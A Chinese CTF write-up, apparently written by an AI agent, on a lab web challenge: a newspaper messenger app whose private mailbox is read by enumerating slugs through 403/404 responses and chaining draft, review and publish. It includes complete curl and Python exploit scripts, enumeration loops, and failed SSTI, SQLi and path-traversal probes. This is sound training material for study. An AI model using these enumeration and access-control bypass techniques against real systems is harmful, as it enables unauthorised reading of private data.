---
title: CTF2 实践靶场 - Web - 华洋晚报·内部信使
date: 2026-11-14 18:44:00
categories:
  - CTF
  - CTF2 实践靶场
  - Web
tags:
  - 业务逻辑越权
  - IDOR
  - 隐藏功能枚举
  - 错误信息泄露
cover: /img/cover/rainy-night-white-hair-girl.jpg
description: CTF2 靶场 Web 题，业务逻辑越权：身份锁死为记者 u1，借 403/404 差异枚举私有信箱、review 的 dest 回显发现隐藏审阅台，再以起稿移交刊发改写草稿带出 flag。
keywords:
  - 内部信使
  - 越权
  - IDOR
  - title oracle
  - 流程串联
ai: >-
  本题是 CTF2 实践靶场的 Web 业务逻辑越权题，场景是一个单页 fetch 驱动的报社内部信使。服务端把会话身份固定为记者林（u1），登录、改署名、请求头伪造等常规提权手段全部被封死。突破口是错误信息作为探测器：读取私有信箱时，存在但无权返回 403、不存在返回 404，据此枚举出四个私有信箱；而提交审阅的 dest 参数在目标不是审阅台时会回显隐藏信箱标题，借此发现界面完全未展示的第二审阅台「主编·密档」，前端占位符给出的 mb-2044 只是诱饵。核心越权链在于 review 会把草稿的 thread 字段改写为 dest，publish 再依 thread 落地：先起稿到自己的私人信箱，再 review 到隐藏密档把 thread 改掉，最后 publish，即可把一条自有消息刊发进该私有信箱。刊发后读取鉴权因调用者在该信箱拥有消息而放行，原本 403 的信箱变为 200，并把主编预置的存档口令连同全部历史消息一并返回，得到 flag。全题不依赖注入或反序列化，纯靠流程越权与间接读越权。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 平台 | BUUCTF CTF2 实践靶场 |
| 环境 | 授权靶场（已脱敏） |
| 分类 | WEB / 业务逻辑越权（Broken Access Control、IDOR、隐藏功能枚举、错误信息泄露） |
| 难度 | 中等 |
| 前端 | 单页 HTML + `fetch` JSON API；`Server: openresty` |
| 后端 | 推断为 Python `http.server`（`OPTIONS` 返回 `501 Unsupported method ('OPTIONS')`，`BaseHTTPRequestHandler` 特征）—— **Inferred**，无源码佐证 |
| 身份 | `POST /api/login {"u":"u1"}` → `记者·林 (u1)`，服务端固定；「主编·袁」账号不可代签 |
| 题目标识 / 难度 / 分值 | **Unknown**（本题由直接给出的靶机地址提供，未从平台题目详情确认；相关标识已脱敏） |

> 靶机 URL、练习场 ID 等真实基础设施信息已按要求脱敏，环境统一记为「授权靶场（已脱敏）」。

前端首页内联 JS 暴露的 API：

| 路径 | 方法 | 作用 |
|---|---|---|
| `/api/login` | POST | 签入，下发 `sid` Cookie |
| `/api/state` | GET | 当前用户、可见信箱、草稿列表 |
| `/api/thread/<slug>` | GET | 读取信箱消息（私有信箱返回 403） |
| `/api/draft` | POST | 起稿（`thread` + `body`） |
| `/api/review` | POST | 提交审阅/移交（`draft` + `dest`） |
| `/api/publish` | POST | 刊发（`draft`） |
| `/api/preview/<docid>` | GET | 样刊预览 |
| `/api/profile` | POST | 改署名（`uid` + `name`） |

`news-desk` 公告给出流程提示：「先在草稿箱起稿，再提交审阅，最后刊发，三步缺一不可」；前端 `dest` 输入框占位符示例是 `mb-2044`（**诱饵**）。

## 信息收集

### 登录与 state

```text
POST /api/login {"u":"u1"}  -> 200 {"ok":true,"me":"记者·林"}   Set-Cookie: sid=...
GET  /api/state            -> 200 {"me":"u1","threads":[
        {"slug":"mb-2052","title":"主编·公告栏","is_public":1},
        {"slug":"mb-2081","title":"记者·林·私人信箱","is_public":0},
        {"slug":"news-desk","title":"公共编辑台","is_public":1}], "drafts":[...]}
```

`state` 只列 3 个信箱，但读私有 slug 时报错可区分存在性。

### 403 作为存在性探针，枚举私有信箱

```text
GET /api/thread/mb-2044 -> 403 {"e":"无权读取该信箱"}     （存在、私有）
GET /api/thread/mb-2043 -> 404 {"e":"信箱不存在"}          （不存在）
```

遍历 `mb-2000..mb-2100`，命中 4 个私有信箱：`mb-2009 / mb-2015 / mb-2044 / mb-2077`。

### review 的 title oracle 发现隐藏审阅台「主编·密档」

```text
POST /api/review {"draft":1,"dest":"mb-2052"} -> 200 {"ok":true,"moved_to":"主编·公告栏"}
POST /api/review {"draft":1,"dest":"mb-2077"} -> 200 {"ok":true,"moved_to":"主编·密档"}   <== 隐藏的第二审阅台
POST /api/review {"draft":1,"dest":"mb-2044"} -> 403 {"e":"该信箱不是审阅台:广告部·信箱"}
POST /api/review {"draft":1,"dest":"mb-2009"} -> 403 {"e":"该信箱不是审阅台:发行部·信箱"}
POST /api/review {"draft":1,"dest":"mb-2015"} -> 403 {"e":"该信箱不是审阅台:校对房·信箱"}
```

`mb-2077` 既是私有信箱（登录态下 `GET /api/thread/mb-2077` 为 403），又是合法审阅台——这是越权链的关键。

## 漏洞分析

### 类型

业务逻辑越权（垂直/水平越权）+ 隐藏功能枚举 + 错误信息作为 Oracle。非注入、非 SSTI、非反序列化、非文件上传。

### 原理

1. **身份不可伪造（Verified）**：服务端把会话身份固定为 `u1`（记者·林）。`/api/login` 忽略 `u`/`role`/`is_chief`/`admin` 等参数（一律返回 `记者·林`），非字符串 `u`（数组/对象）触发 `403 该账号无法由你签入`；`/api/profile` 改他人 `uid` 触发 `403 不能替别人改署名`。常规提权路径全部封死。
2. **403/404 存在性差异（Verified）**：`/api/thread/<slug>` 对「存在但无权」返回 `403 无权读取该信箱`，对「不存在」返回 `404 信箱不存在`。据此枚举 `mb-2000..mb-2100`，得到 4 个私有信箱：`mb-2009 / mb-2015 / mb-2044 / mb-2077`。
3. **`/api/review` 标题回显 / title oracle（Verified）**：`dest` 指向已存在但非审阅台的信箱返回 `403 该信箱不是审阅台:<标题>`（泄露隐藏信箱标题）；指向审阅台返回 `200 {"ok":true,"moved_to":<标题>}`。由此发现**第二个、UI 完全未展示的审阅台 `mb-2077 = 主编·密档`**。而 `mb-2044`（前端占位符）只是「广告部·信箱」，非审阅台、非目标。
4. **越权链（核心，Verified）**：`review` 会把草稿的 `thread` 字段改写为 `dest`（`/api/state` 中 `draft.thread` 从 `mb-2081` 变为 `mb-2077` 可验证）。虽然 `/api/draft` 直接向私有信箱写入会 `403 无权写入该信箱`，但通过「起稿到自己的信箱 → `review dest=mb-2077` 把 `thread` 改成密档 → `publish`」三步，即可把一条自有消息刊发进 `主编·密档`。`publish` 之后该私有信箱对 `u1` 由 `403` 变为 `200`，`GET /api/thread/mb-2077` 连同**主编预置的存档口令（flag）**一并返回。

> 根因（**Inferred**）：`/api/thread/<slug>` 的读取鉴权疑似以「信箱公开，或调用者在该信箱内拥有消息」为条件。刊发把自有消息写入 `mb-2077` 后满足后者，绕过私有信箱读取限制，把该信箱**全部历史消息**（含仅主编可见的 flag）一并返回。无源码，具体判定条件未知。

## 利用过程

构造越权链：起稿 → 移交密档 → 刊发 → 读回。

```text
POST /api/draft   {"thread":"mb-2081","body":"final-repro"}   -> 200 {"ok":true,"draft":47,"thread":"mb-2081"}
POST /api/review  {"draft":47,"dest":"mb-2077"}                -> 200 {"ok":true,"moved_to":"主编·密档"}
                 （/api/state 中 draft.thread 已变为 mb-2077）
POST /api/publish {"draft":47}                                 -> 200 {"ok":true,"published_to":"主编·密档"}
GET  /api/thread/mb-2077                                      -> 200
  {"slug":"mb-2077","title":"主编·密档","messages":[
    {"author":"主编·袁","body":"本档仅限主编本人。存档口令如下,阅后即焚:flag{xxxx}"},
    {"author":"记者·林","body":"final-repro"}]}
```

对照：刊发**之前** `GET /api/thread/mb-2077` 为 `403 无权读取该信箱`；刊发**之后**变为 `200` 并回显全部消息（含 flag）。已在全新会话干净复现该差异。

### 排除的误区（decoy 验证，均 Verified）

| 尝试 | 结果 |
|---|---|
| 登录 `u2/admin/chief`、加 `role/is_chief/admin`、数组/字典 `u` | 身份恒为 `u1`；非字符串触发 403 |
| `/api/profile` 改 `uid` 他人、加 `role/admin` | `403 不能替别人改署名`；不影响读权限 |
| `/api/draft` 直接写 `thread=mb-2044/2009/2015/2077` | `403 无权写入该信箱` |
| `publish` 携带 `dest/thread/to/target/slug/published_to` 参数 | 一律仍发到草稿自身 `thread`，无法直接指定目标 |
| `/api/preview/1001/1002` | 「样刊·头版/副刊(你的)」「内容略」；`1003+` → `预览不存在或已删除`（诱饵） |
| `profile.name` / `draft.body` 注入 `{{7*7}}`、`${7*7}` | 原样回显，无 SSTI |
| `preview/<id>` SQLi / 路径穿越 / 空字节 | 无注入；`%00` 触发 openresty 400 |
| 请求头 `X-User/X-Forwarded-User`、query `uid/as/admin` 伪造 | 无效 |
| 隐藏端点 `/api/flag /source /app.py /.git/config` | 均 404 |

## 完整 EXP

> 归档 payload 原始请求序列（BASE 已替换为占位地址）。核心四步：

```text
POST /api/draft   {"thread":"mb-2081","body":"x"}    -> draft id
POST /api/review  {"draft":<id>,"dest":"mb-2077"}    -> 越权改写 thread 为 主编·密档
POST /api/publish {"draft":<id>}                     -> 刊发进 mb-2077，私有信箱转为可读
GET  /api/thread/mb-2077                             -> 200 回显 flag
```

curl 命令：

```bash
BASE="http://target:8080"
JAR=/tmp/huayang.cookies

# 1) 签入（保存 sid）
curl -s -c "$JAR" -H "Content-Type: application/json" \
  -d '{"u":"u1"}' "$BASE/api/login"

# 2) 起稿到自己的私人信箱，记下返回的 draft id
DRAFT=$(curl -s -b "$JAR" -H "Content-Type: application/json" \
  -d '{"thread":"mb-2081","body":"final-repro"}' "$BASE/api/draft" \
  | python -c "import sys,json;print(json.load(sys.stdin)['draft'])")
echo "draft=$DRAFT"

# 3) 越权移交到隐藏审阅台 mb-2077（把草稿 thread 改成 主编·密档）
curl -s -b "$JAR" -H "Content-Type: application/json" \
  -d "{\"draft\":$DRAFT,\"dest\":\"mb-2077\"}" "$BASE/api/review"

# 4) 刊发：publish 依 draft.thread 把消息写入 mb-2077，使该私有信箱对 u1 可读
curl -s -b "$JAR" -H "Content-Type: application/json" \
  -d "{\"draft\":$DRAFT}" "$BASE/api/publish"

# 5) 读取 主编·密档（此前为 403 无权读取，现在 200 并带出 flag）
curl -s -b "$JAR" "$BASE/api/thread/mb-2077"
```

完整 Python 脚本（exp）：

```python
# -*- coding: utf-8 -*-
import requests, re, json
BASE = "http://target:8080"
s = requests.Session()
def J(r):
    try: return r.json()
    except Exception: return {"raw": r.text[:200]}

s.post(BASE+"/api/login", json={"u":"u1"})                          # 恒为 记者·林(u1)
d = J(s.post(BASE+"/api/draft", json={"thread":"mb-2081",
                                      "body":"final-repro"}))
did = d["draft"]
print("review ->", J(s.post(BASE+"/api/review",
                            json={"draft":did, "dest":"mb-2077"}))) # 隐藏审阅台
print("publish->", J(s.post(BASE+"/api/publish", json={"draft":did})))
r = s.get(BASE+"/api/thread/mb-2077")                               # 越权读回
t = J(r)
print("thread ->", r.status_code, json.dumps(t, ensure_ascii=False))
m = re.search(r"flag\{[^}]+\}", json.dumps(t, ensure_ascii=False))
print("FLAG =", m.group(0) if m else "NOT FOUND")
```

侦察 / Oracle（可复用的探测手法）：

```bash
# 存在性探针：403=存在但私有，404=不存在
for n in $(seq 2000 2100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "$JAR" "$BASE/api/thread/mb-$n")
  [ "$code" = "403" ] && echo "private: mb-$n"
done
# => mb-2009 mb-2015 mb-2044 mb-2077

# title oracle：review 的 dest 回显隐藏信箱标题 / 审阅台
for d in mb-2009 mb-2015 mb-2044 mb-2052 mb-2077 mb-2081 news-desk; do
  echo -n "$d -> "
  curl -s -b "$JAR" -H "Content-Type: application/json" \
    -d "{\"draft\":1,\"dest\":\"$d\"}" "$BASE/api/review"
  echo
done
# mb-2052 -> 200 moved_to:主编·公告栏   (UI 已知的审阅台)
# mb-2077 -> 200 moved_to:主编·密档     (隐藏的第二审阅台，突破口)
# mb-2044 -> 403 该信箱不是审阅台:广告部·信箱   (诱饵)
# mb-2009 -> 403 该信箱不是审阅台:发行部·信箱
# mb-2015 -> 403 该信箱不是审阅台:校对房·信箱
```

排除的替代 payload（均无效，已验证）：

```text
POST /api/login {"u":"u2"|"admin"|"chief"}         -> 200 记者·林（身份不可伪造）
POST /api/login {"u":["u2"]}                       -> 403 该账号无法由你签入
POST /api/profile {"uid":"u2","name":"x"}          -> 403 不能替别人改署名
POST /api/draft {"thread":"mb-2044","body":"x"}    -> 403 无权写入该信箱
POST /api/draft {"thread":"mb-2077","body":"x"}    -> 403 无权写入该信箱
POST /api/publish {"draft":N,"dest":"mb-2077"}     -> 仍发到草稿自身 thread，无法指定目标
GET  /api/preview/1003                             -> 404 预览不存在或已删除（诱饵）
POST /api/draft {"thread":"mb-2081",
                 "body":"{{7*7}}"|"${7*7}"}         -> 原样回显，无 SSTI
GET  /api/thread/mb-2077  (刊发前)                 -> 403 无权读取该信箱
```

### 触发逻辑

1. 服务端把会话身份锁死为 `u1`，常规提权全部封死；flag 藏在 `主编·密档(mb-2077)` 里，该信箱私有且读取返回 403。
2. `/api/review` 的 `dest` 会**把草稿的 `thread` 字段改写为目标信箱**，并回显目标信箱标题。用它发现隐藏的第二审阅台 `mb-2077`。
3. `review dest=mb-2077` 越权把草稿 `thread` 改成密档；`publish` 依 `thread` 把自有消息刊发进 `mb-2077`。
4. 读取鉴权（Inferred）以「信箱公开，或调用者在该信箱内拥有消息」为条件；刊发后满足条件，`GET /api/thread/mb-2077` 由 403 变 200，并把该信箱**全部历史消息**（含主编预置的存档口令 flag）一并返回。
5. 属业务逻辑越权 / 间接读越权，非注入、非 SSTI、非反序列化。

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式，藏于 `主编·密档(mb-2077)` 中主编·袁的预置存档口令，经越权链刊发后 `GET /api/thread/mb-2077` 回显得到。

刊发后响应（flag 已脱敏）：

```json
{"slug":"mb-2077","title":"主编·密档","messages":[
  {"author":"主编·袁","body":"本档仅限主编本人。存档口令如下,阅后即焚:flag{xxxx}"},
  {"author":"记者·林","body":"final-repro"}]}
```

### 提交记录

| 项 | 值 |
|---|---|
| Flag | `flag{xxxx}` |
| 获取方式 | 越权链回显（全新会话干净复现，已验证） |
| 平台提交 | **未提交** |
| 未提交原因 | 本题由用户直接给出靶机地址提供，未在 Agent 可见的练习场题库或竞赛列表中定位到对应的题目标识（练习场与靶机信息已脱敏）；平台提交需携带对应标识，故未做平台提交，也未盲试 |
| submission_id | 无 |
| 结果 | 靶机侧 flag 已到手、WP 已落盘；若需平台记分，需补充本题所属题目标识或练习场信息 |

## 踩坑与总结

1. **错误信息即探测器**：`403 无权读取` vs `404 不存在` 可枚举隐藏对象；`该信箱不是审阅台:<标题>` 会泄露隐藏对象的标题与角色。
2. **隐藏功能是突破口**：`state`/UI 只暴露 `mb-2052` 一个审阅台，`mb-2077 = 主编·密档` 是靠 `review dest` 的 oracle 才发现的第二审阅台。
3. **流程越权**：`review` 把用户可控的 `dest` 写进草稿 `thread`，`publish` 再依 `thread` 落地——两步串联即可绕过 `/api/draft` 的私有信箱写保护。
4. **间接读越权**：不直接读私有信箱（403），而是先让自己在该信箱「拥有一条消息」，从而让读取鉴权放行并带出整段历史（含 flag）。
5. **不要被占位符带偏**：前端 `dest` 示例 `mb-2044` 是「广告部·信箱」诱饵，真正目标是 `mb-2077`。
6. 身份服务端锁死，登录参数 / 请求头 / 改署名 / SSTI / SQLi 等常规路径均无效，解题核心是业务流程而非注入。
